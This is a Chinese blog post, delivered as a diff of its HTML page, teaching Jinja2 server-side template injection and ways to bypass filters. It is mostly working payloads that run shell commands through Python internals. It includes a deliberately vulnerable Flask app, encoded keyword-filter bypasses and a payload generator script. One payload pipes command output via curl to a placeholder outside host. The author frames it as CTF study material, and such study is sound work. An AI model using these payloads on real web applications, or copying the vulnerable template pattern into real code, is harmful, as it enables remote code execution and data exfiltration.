@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lockcy.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="jinjia2 ssti bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jinjia2 ssti及bypass">
+<meta property="og:url" content="https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/index.html">
+<meta property="og:site_name" content="lockcy&#39;s cave">
+<meta property="og:description" content="jinjia2 ssti bypass">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/1.png">
+<meta property="article:published_time" content="2021-04-01T06:26:31.000Z">
+<meta property="article:modified_time" content="2021-04-06T04:04:05.342Z">
+<meta property="article:author" content="lockcy">
+<meta property="article:tag" content="ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/1.png">
+
+<link rel="canonical" href="https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>jinjia2 ssti及bypass | lockcy's cave</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lockcy's cave</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/lockcy" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/harutya.jpg">
+      <meta itemprop="name" content="lockcy">
+      <meta itemprop="description" content="A mind at peace with all below, a heart whose love is innocent!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lockcy's cave">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          jinjia2 ssti及bypass
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-01 14:26:31" itemprop="dateCreated datePublished" datetime="2021-04-01T14:26:31+08:00">2021-04-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-06 12:04:05" itemprop="dateModified" datetime="2021-04-06T12:04:05+08:00">2021-04-06</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>jinjia2 ssti bypass</p>
+<span id="more"></span>
+<p>本文仅针对python3下的jinjia2 SSTI<br>测试代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template_string, request</span><br><span class="line">import re</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;index&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;)</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">            &lt;h1&gt;TEST SSTI.&lt;&#x2F;h1&gt;</span><br><span class="line">            &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &#39;&#39;&#39; %(name)</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p><font size=6>无过滤情况</font><br><strong>获取基本类</strong></p>
+<p>使用str dict tuple list对象获取基本类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[1]</span><br><span class="line">&#39;&#39;.__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+<p>利用jinjia2中特有对象获取基本类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.__class__.__mro__[10]</span><br><span class="line">get_flashed_messages.__class__.__mro__[1]</span><br><span class="line">url_for .__class__.__mro__[1]</span><br><span class="line">config.__class__.__mro__[2]</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+<p><strong>执行命令</strong><br>如果运气好的话，获取的子类内建模块中有os</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[103].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()</span><br></pre></td></tr></table></figure>
+<p>但大部分情况是没有os模块的，需要自己引入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</span><br></pre></td></tr></table></figure>
+<p><strong>通用命令执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><font size=6>BYPASS</font><br><strong>关键字</strong><br>过滤class base mro globals builtins import get eval等关键字<br>(1) 拼接字符串+ attr过滤器</p>
+<img src="/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/1.png" class="">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;[&#39;__clas&#39;&#39;s__&#39;]和&#39;&#39;.__class__的执行结果一致</span><br><span class="line">.__base__和|attr(&quot;__ba&quot;&quot;se__&quot;)的执行结果一致</span><br></pre></td></tr></table></figure>
+<p>完整的payload构造一下就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;index?name&#x3D;&#123;&#123;((&#39;&#39;[&quot;__clas&quot;&quot;s__&quot;]|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__sub&quot;&quot;classes__&quot;)())[75]|attr(&quot;__i&quot;&quot;nit__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;))[&quot;__buil&quot;&quot;tins__&quot;][&quot;e&quot;&quot;val&quot;](&#39;__imp&#39;&#39;ort__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>(2)request对象接受参数绕过，这种方式比较灵活,但在过滤request后无法使用<br>GET</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.d1]&#125;&#125;&amp;d1&#x3D;__class__</span><br></pre></td></tr></table></figure>
+<p>POST</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.form.d1]&#125;&#125;&amp;d1&#x3D;__class__</span><br></pre></td></tr></table></figure>
+<p>完整的payload构造一下就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;index?name&#x3D;&#123;&#123;(&#39;&#39;[request.args.d1])[request.args.d2][request.args.d3]()[75][request.args.d4][request.args.d5][request.args.d6][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)&#125;&#125;&amp;d1&#x3D;__class__&amp;d2&#x3D;__base__&amp;d3&#x3D;__subclasses__&amp;d4&#x3D;__init__&amp;d5&#x3D;__globals__&amp;d6&#x3D;__builtins__</span><br></pre></td></tr></table></figure>
+
+<p><strong>过滤中括号</strong><br>过滤中括号比较简单,object[x] 调用的就是<strong>getitem</strong>方法，但过滤中括号的话可以使用<strong>getitem</strong>或get绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(75).__init__.__globals__.__builtins__.__getitem__(&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</span><br></pre></td></tr></table></figure>
+<p><strong>过滤下划线</strong><br>(1) 之前的request对象传参绕过<br>(2) 格式化字符串绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">()[&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)]</span><br><span class="line">()[&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;[&#39;format&#39;](95,95,99,108,97,115,115,95,95)]</span><br></pre></td></tr></table></figure>
+
+<p>这里使用不了<code>__import__</code>,只能尝试下内置模块，或是反弹shell，存在局限性，还是推荐用request对象传参，方便灵活<br>完整的payload(exec不像eval返回结果，无回显curl外带命令执行)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[&#39;exec&#39;]</span><br><span class="line">()[&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;[&#39;format&#39;](95, 95, 99, 108, 97, 115, 115, 95, 95)][&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&quot;[&#39;format&#39;](95, 95, 98, 97, 115, 101, 95, 95)][&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#123;11:c&#125;&#123;12:c&#125;&#123;13:c&#125;&quot;[&#39;format&#39;](95, 95, 115, 117, 98, 99, 108, 97, 115, 115, 101, 115, 95, 95)]()[75][&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&quot;[&#39;format&#39;](95, 95, 105, 110, 105, 116, 95, 95)][&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&quot;[&#39;format&#39;](95, 95, 103, 108, 111, 98, 97, 108, 115, 95, 95)][&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#123;11:c&#125;&quot;[&#39;format&#39;](95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)][&#39;exec&#39;](&#39;import os;os.popen(&quot;whoami|curl -F :data&#x3D;@- xxx.xxx.xxx.xxx:xxxx&quot;).read();&#39;)</span><br></pre></td></tr></table></figure>
+<p>附个撸的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def encrypt():</span><br><span class="line">    change_chr &#x3D; string.ascii_lowercase+&#39;_&#39;</span><br><span class="line">    raw &#x3D; &#39;&#39;&#39;().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;]&#39;&#39;&#39;</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    for datas in raw.split(&#39;__&#39;):</span><br><span class="line">        ch &#x3D; &#39;&#39;</span><br><span class="line">        ch2 &#x3D; []</span><br><span class="line">        if count % 2 &#x3D;&#x3D; 1:</span><br><span class="line">            ch1 &#x3D; &#39;&#39;</span><br><span class="line">            c &#x3D; 0</span><br><span class="line">            datas &#x3D; &#39;__&#39;+datas + &#39;__&#39;</span><br><span class="line">            for data in datas:</span><br><span class="line">                ch1 &#x3D; ch1 + &#39;&#123;%s:c&#125;&#39; % str(c)</span><br><span class="line">                c +&#x3D; 1</span><br><span class="line">                ch2.append(ord(data))</span><br><span class="line">            ch +&#x3D; &quot;[\&quot;&#123;0&#125;\&quot;[&#39;format&#39;](&#123;1&#125;)]&quot;.format(ch1, str(ch2).strip(&#39;[&#39;).strip(&#39;]&#39;))</span><br><span class="line">        else:</span><br><span class="line">            ch +&#x3D; datas.strip(&#39;.&#39;)</span><br><span class="line">        count +&#x3D; 1</span><br><span class="line">        result +&#x3D; ch</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+<p>(3) 使用过滤器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取下划线</span><br><span class="line">&#123;%set xiahua&#x3D;(()|select|string)[24]%&#125;</span><br><span class="line">&#123;&#123;xiahua&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;%set xiahua&#x3D;(lipsum|string|list).pop(18)%&#125;</span><br><span class="line">&#123;&#123;xiahua&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取chr函数; lipsum.__globals__[&#39;__builtins__&#39;].chr</span><br><span class="line">&#123;%set gb&#x3D;dict(glo&#x3D;a,bals&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set gm&#x3D;(xiahua,xiahua,gb,xiahua,xiahua)|join%&#125;</span><br><span class="line">&#123;%set gt&#x3D;dict(ge&#x3D;a,t&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set bt&#x3D;dict(buil&#x3D;a,tins&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set bm&#x3D;(xiahua,xiahua,bt,xiahua,xiahua)|join%&#125;</span><br><span class="line">&#123;%set c&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set cf&#x3D;lipsum|attr(gm)|attr(gt)(bm)|attr(gt)(c)%&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 执行命令;lipsum.__globals__.__builtins__[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</span><br><span class="line"></span><br><span class="line">&#123;%set el&#x3D;dict(ev&#x3D;a,al&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set excute&#x3D;(cf(95),cf(95),cf(105),cf(109),cf(112),cf(111),cf(114),cf(116),cf(95),cf(95),cf(40),cf(34),cf(111),cf(115),cf(34),cf(41),cf(46),cf(112),cf(111),cf(112),cf(101),cf(110),cf(40),cf(34),cf(119),cf(104),cf(111),cf(97),cf(109),cf(105),cf(34),cf(41),cf(46),cf(114),cf(101),cf(97),cf(100),cf(40),cf(41))|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(gm))|attr(gt)(bm)|attr(gt)(el)(excute|string)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>完整payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set xiahua&#x3D;(lipsum|string|list).pop(18)%&#125;</span><br><span class="line">&#123;%set gb&#x3D;dict(glo&#x3D;a,bals&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set gm&#x3D;(xiahua,xiahua,gb,xiahua,xiahua)|join%&#125;</span><br><span class="line">&#123;%set gt&#x3D;dict(ge&#x3D;a,t&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set bt&#x3D;dict(buil&#x3D;a,tins&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set bm&#x3D;(xiahua,xiahua,bt,xiahua,xiahua)|join%&#125;</span><br><span class="line">&#123;%set c&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set cf&#x3D;lipsum|attr(gm)|attr(gt)(bm)|attr(gt)(c)%&#125;</span><br><span class="line">&#123;%set el&#x3D;dict(ev&#x3D;a,al&#x3D;a)|join%&#125;</span><br><span class="line">&#123;%set excute&#x3D;(cf(95),cf(95),cf(105),cf(109),cf(112),cf(111),cf(114),cf(116),cf(95),cf(95),cf(40),cf(34),cf(111),cf(115),cf(34),cf(41),cf(46),cf(112),cf(111),cf(112),cf(101),cf(110),cf(40),cf(34),cf(119),cf(104),cf(111),cf(97),cf(109),cf(105),cf(34),cf(41),cf(46),cf(114),cf(101),cf(97),cf(100),cf(40),cf(41))|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(gm))|attr(gt)(bm)|attr(gt)(el)(excute|string)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>总结</strong><br>jinjia2 SSTI bypass的技巧非常灵活，要善于使用过滤器和一些内建模块来绕过限制，虽然在实战中用处不大，但在CTF中还是有一些价值的。</p>
+<p>参考内容:<br><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">https://jinja.palletsprojects.com/en/2.11.x/templates/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40648358/article/details/106345166">https://blog.csdn.net/qq_40648358/article/details/106345166</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+          <div>
+            
+              
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>jinjia2 ssti及bypass</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2021年04月01日 - 14:26:31</p>
+  <p><span>最后更新:</span>2021年04月06日 - 12:04:05</p>
+  <p><span>原始链接:</span><a href="/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/" title="jinjia2 ssti及bypass">https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lockcy.github.io/2021/04/01/jinjia2-ssti%E5%8F%8Abypass/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+
+            
+          </div>
+          
+          <div class="post-tags">
+              <a href="/tags/ssti/" rel="tag"># ssti</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
